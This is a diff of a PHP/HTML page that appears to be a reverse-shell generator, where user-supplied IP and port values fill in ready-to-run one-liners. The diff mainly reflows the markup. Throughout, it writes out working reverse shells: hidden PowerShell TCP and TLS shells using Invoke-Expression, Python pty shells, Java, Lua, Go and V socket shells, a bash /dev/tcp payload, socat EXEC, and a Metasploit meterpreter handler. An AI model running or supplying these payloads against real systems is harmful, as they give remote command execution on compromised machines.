@@ -1,5 +1,4 @@
 
-
 <!-- Include Head -->
 <?php include "assest/head.php"; ?>
 <?php include "assest/header.php" ?>
@@ -311,6 +310,8 @@ background-color: #666;
   <div id="socat" class="w3-container city1 w3-animate-opacity">
   <br>
 <div id="mydiv">
+  <p id="again special"></p>
+  <p> &nbsp </p>
       <p>socat -d -d TCP-LISTEN:</p>
       <p id="port hundred one"></p>
   <p> &nbsp;STDOUT</p>
@@ -323,9 +324,11 @@ background-color: #666;
     <br>
  
    <p>
-    msfconsole -q -x &#8243use multi/handler;
-    set payload windows/x64/meterpreter/reverse_tcp;
-    </p>
+      <div id="mydiv">
+     <p id="special cases"></p>
+   <p>&nbsp msfconsole -q -x &#8243use multi/handler;
+set payload windows/x64/meterpreter/reverse_tcp;</p>
+</div>
     <div id="mydiv">
   <p>  set lhost&nbsp</p>
    <p id="demo"></p>
@@ -334,9 +337,8 @@ background-color: #666;
  <p id="port hundred"> </p>
   <p>; exploit&#8243</p>
   </div>
-  
-<br>
-<br>
+    </p>
+ 
   
  </div>
  
@@ -441,16 +443,16 @@ result.textContent = `  ${event.target.value}`;
     </div>
   </div>
   
-   <div class="ans"> </div>
+   <div class="osans"> </div>
    
      <script>
-     
-     const selecterElement = document.querySelector('.OS');
+     const osans = document.querySelector('.OS');
 
-selecterElement.addEventListener('change', (event) => {
-  const ans = document.querySelector('.ans');
-  ans.textContent = ` ${event.target.value}`;
+osans.addEventListener('change', (event) => {
+  const osans = document.querySelector('.osans');
+  osans.textContent = `  ${event.target.value}`;
 });
+
 
 
 </script>
@@ -533,7 +535,7 @@ selecterElement.addEventListener('change', (event) => {
   <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power2')">PowerShell #2</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power3')">PowerShell #3</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power4')">PowerShell #4 (TLS)</div>
-  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'power364')">PowerShell #3 (Base64)</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'power364')"> (Base64) PowerShell #3</div>
    
 <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'zsh')">zsh</div>
 
@@ -541,7 +543,7 @@ selecterElement.addEventListener('change', (event) => {
   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py2')">Python #2</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py31')">Python3 #1</div>
    <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py32')">Python3 #2</div>
-    <div class="tablinks w3-bar-item w3-button filterDiv All Linux" onclick="City(event, 'py3short')">Python3 shortest</div>
+    <div class="tablinks w3-bar-item w3-button filterDiv All Linux" onclick="City(event, 'py3short')"> shortest Python3 </div>
       <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'telnet')">telnet</div>
       <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ruby1')">Ruby #1</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'rubynosh')">Ruby no sh</div>
@@ -1878,20 +1880,25 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
-  <p>Command:</p>
-    <div id="mydiv">
     <p>
-    
-    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("</p>
+  <p>Command:</p>
+  
+    <div id="mydiv">
+    <p> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("</p>
       <p id="ip fourty nine"></p>
      <p>",</p>
     <p id="port fourty nine"></p>
-    
-   <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-    
+     </div>
+   <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};</p>
+   <p>    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data </p>
+    <p>   = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</p>
+    <p>   $sendback = (iex $data 2>&amp1 | Out-String );$sendback2  = $sendback + "PS "</p>
+     <p>   + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</p>
+   <p>   $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</p>
+    <br>
     </p>
  
-     </div>
+     
 </div>
 </div>
 
@@ -1902,6 +1909,7 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
+   <p>
   <p>Command:</p>
       <div id="mydiv">
     <p>
@@ -1909,11 +1917,19 @@ $port =
     <p id="ip fifty"></p>
      <p>',</p>
     <p id="port fifty"></p>
-    
-  <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+ 
+  <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};</p>
+      </div>
+    <p>   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;</p>
+     <p>  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</p>
+      <p> $sendback = (iex $data 2>&amp1 | Out-String );$sendback2 = $sendback + 'PS ' </p>
+      <p> + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</p>
+      <p> $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</p>
+
+    <br>
     
     </p>
-  </div>
+   
 </div>
 </div>
 
@@ -1925,24 +1941,34 @@ $port =
 <div id="power3" class="tabcontent">
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
-   
+   <p>
   <p>Command:</p>
   
-      <div id="mydiv">
-    <p>
-    
-    powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('</p>
+ 
+     
+          <div id="mydiv">
+    <p>powershell -nop -W hidden -noni -ep bypass -c "$TCPClient =
+     New-Object Net.Sockets.TCPClient('</p>
      <p id="ip fifty one"></p>
      <p>',</p>
     <p id="port fifty one"></p>
     
+    </div>
     
-    
-   <p> );$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&amp1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+   <p> );$NetworkStream = $TCPClient.GetStream();$StreamWriter =  </p>
+      <p>  New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) </p>
+        <p> {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}; </p>
+        <p> $StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()} </p>
+       <p>  WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) </p>
+       <p>   -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); </p>
+        <p>  $Output = try {Invoke-Expression $Command 2>&amp1 | Out-String} catch {$_ | Out-String} </p>
+       <p>   WriteToStream ($Output)}$StreamWriter.Close()" </p>
+
+       <br>
     </p>
  
      
-</div>
+ 
 
 </div>
 </div>
@@ -1955,6 +1981,7 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
+      <p>
   <p>Command:</p>
    <div id="mydiv">
     <p>
@@ -1964,14 +1991,26 @@ $port =
      <p>',</p>
     <p id="port fifty two"></p>
     
+    </div>
+  <p>  );$NetworkStream = $TCPClient.GetStream();$SslStream =  </p>
+   <p>    New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as  </p>
+     <p>  [Net.Security.RemoteCertificateValidationCallback])); </p>
+     <p>  $SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false); </p>
+     <p>  if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close(); </p>
+      <p> exit}$StreamWriter = New-Object IO.StreamWriter($SslStream); </p>
+      <p> function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize </p>
+      <p>  | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}; </p>
+      <p>  WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length))  </p>
+      <p>  -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); </p>
+      <p>  $Output = try {Invoke-Expression $Command 2>&amp1 | Out-String} catch {$_ | Out-String} </p>
+       <p> WriteToStream ($Output)}$StreamWriter.Close()" </p>
     
-  <p>  );$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&amp1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
-    
+    <br>
     
     </p>
     
      
-</div>
+ 
 </div>
 </div>
 
@@ -2059,6 +2098,7 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
+    <p>
   <p>Command:</p>
   
     <div id="mydiv">
@@ -2070,15 +2110,17 @@ $port =
    <p> ";export RPORT=</p>
     
        <p id="port fifty four"></p>
-   <p> ;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
+   <p> ;python -c 'import sys,socket,os,pty;s=socket.socket();</p>
+    <p> s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));</p>
+    <p> [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
     
      <div class="twentyfive"> </div>
     
   <p>  ")'
-    
+      </div>
     </p>
      
-     </div>
+    
 </div>
 </div>
 
@@ -2086,17 +2128,19 @@ $port =
 <div id="py2" class="tabcontent">
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
-   
+   <p>
   <p>Command:</p>
   <div id="mydiv">
     <p>
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
+    python -c 'import socket,subprocess,os;s=socket.socket</p>
+    <p>(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
     
      <p id="ip fifty five"></p>
      <p>",</p>
     <p id="port fifty five"></p>
     
-  <p>  ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
+  <p>  ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</p>
+   <p> os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
   
    <div class="twentysix"> </div>
  <p>  ")'</p>
@@ -2104,7 +2148,7 @@ $port =
     
     
   </div>
-     
+     </p>
 </div>
 </div>
 
@@ -2112,8 +2156,9 @@ $port =
 <div id="py31" class="tabcontent">
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
-   
+    <p>
   <p>Command:</p>
+  
   <div id="mydiv">
     <p>
     export RHOST="</p>
@@ -2122,8 +2167,10 @@ $port =
     
     <p>";export RPORT=</p>
     
-    <p id="port fifty five"></p>
-    <p>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
+    <p id="port fifty six"></p>
+    <p>;python3 -c 'import sys,socket,os,pty;s=socket.socket();</p>
+      <p>s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));</p>
+    <p>  [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
     
       <div class="twentyseven"> </div>
    <p> ")'</p>
@@ -2133,6 +2180,7 @@ $port =
      
     
    </div>
+   </p>
 </div>
 </div>
 
@@ -2142,21 +2190,25 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
+   <p>
   <p>Command:</p>
   <div id="mydiv">
     <p>
-    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
+    python3 -c 'import socket,subprocess,os;s=socket.socket</p>
+   <p> (socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
     
     <p id="ip fifty seven"></p>
      <p>",</p>
     <p id="port fifty seven"></p>
     
-   <p> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
+   <p> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</p>
+    <p> os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
      <div class="twentyeight"> </div>
  <p>  ")'</p>
     
     
  </div>
+ </p>
 </div>
 </div>
  
@@ -2166,6 +2218,7 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
+ 
   <p>Command:</p>
   
    <div id="mydiv">
@@ -2340,7 +2393,7 @@ $port =
     <p>:</p>
      <p id="port sixty three"></p>
       <p> &nbsp</p>
-    EXEC: </p>
+    <p>EXEC: </p>
     <div class="thirtytwo"> </div>
  </div>
 </div>
@@ -2357,6 +2410,7 @@ $port =
      <p id="ip sixty four"></p>
     <p>:</p>
      <p id="port sixty four"></p>
+        <p> &nbsp</p>
    <p> EXEC:'</p>
      <div class="thirtythree"> </div>
    <p> ',pty,stderr,setsid,sigint,sane</p>
@@ -2433,6 +2487,7 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
+   <p>
   <p>Command:</p>
   <div id="mydiv">
     <p>
@@ -2444,11 +2499,19 @@ $port =
     <p>;String cmd="</p>
     
      <div class="thirtysix"> </div>
-    <p>";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>
+           </div>
+    <p>";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();</p>
+         
+     <p> Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),</p>
+     <p> pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),</p>
+      <p>so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());</p>
+     <p> while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());</p>
+     <p> so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};</p>
+     <p> p.destroy();s.close();</p>
     
      
-     
-  </div>
+      <br>
+  </p>
 </div>
 </div>
 
@@ -2466,7 +2529,8 @@ $port =
    <p>      Process p;</p>
    <p>      try {</p>
    
-     <p>  <div id="mydiv">
+    
+         <div id="mydiv">
            <p> p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/</p>
            
             <p id="ip sixty eight"></p>
@@ -2682,6 +2746,7 @@ ref.add(new StringRefAddr("x", x);</p>
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
+   <p>
   <p>Command:</p>
   <div id="mydiv">
     <p> lua5.1 -e 'local host, port = "</p>
@@ -2692,9 +2757,15 @@ ref.add(new StringRefAddr("x", x);</p>
     <p id="port seventy three"></p>
     
      <p> &nbsp</p>
-    <p> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' </p>
+     </div>
+    <p> local socket = require("socket") local tcp =</p>
+       <p>  socket.tcp() local io = require("io") tcp:connect(host, port);</p>
+       <p>   while true do local cmd, status, partial = tcp:receive() local f =</p>
+       <p>    io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s)</p>
+       <p>     if status == "closed" then break end end tcp:close()' </p>
      
-  </div>
+     
+  </p>
 </div>
 </div>
 
@@ -2713,10 +2784,11 @@ ref.add(new StringRefAddr("x", x);</p>
    <p> ");cmd:=exec.Command("</p>
     
     <div class="fourty"> </div>
+          </div>
+    <p>");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' </p>
+    <p>  > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go </p>
     
-    <p>");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go </p>
-    
-  </div>
+  
 </div>
 </div>
 
@@ -2733,10 +2805,10 @@ ref.add(new StringRefAddr("x", x);</p>
      <p> &nbsp</p>
     <p id="port seventy five"></p>
 <p>    &nbsp</p>
-
+   </div>
     
   <p>  &nbsp0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v </p>
-    </div>
+  
      
  
 </div>
@@ -3789,10 +3861,15 @@ function secFunction() {
   else if(x < 1024  || x > 49151)
   {
   document.getElementById("other cases").innerHTML=y;
+    document.getElementById("special cases").innerHTML=y;
+      document.getElementById("again special").innerHTML=y;
   text=x;
   }
   else
   {
+    document.getElementById("other cases").innerHTML=" ";
+    document.getElementById("special cases").innerHTML=" ";
+      document.getElementById("again special").innerHTML=" ";
   text= x;
   }
  document.getElementById("port hundred").innerHTML = text;
@@ -3859,7 +3936,7 @@ function secFunction() {
  document.getElementById("port fifty two").innerHTML = text;
  document.getElementById("port fifty three").innerHTML = text;
  document.getElementById("port fifty four").innerHTML = text;
- document.getElementById("port fifty five").innerHTML = text;
+document.getElementById("port fifty five").innerHTML = text;
  document.getElementById("port fifty six").innerHTML = text;
  document.getElementById("port fifty seven").innerHTML = text;
  document.getElementById("port fifty eight").innerHTML = text;
@@ -3881,7 +3958,7 @@ function secFunction() {
               document.getElementById("port seventy three").innerHTML = text;
                    document.getElementById("port seventy four").innerHTML = text;
            document.getElementById("port seventy five").innerHTML = text;
-                    
+                  
 }
 
 
@@ -3890,4 +3967,5 @@ function secFunction() {
 
 </body>
 </html>
+
 
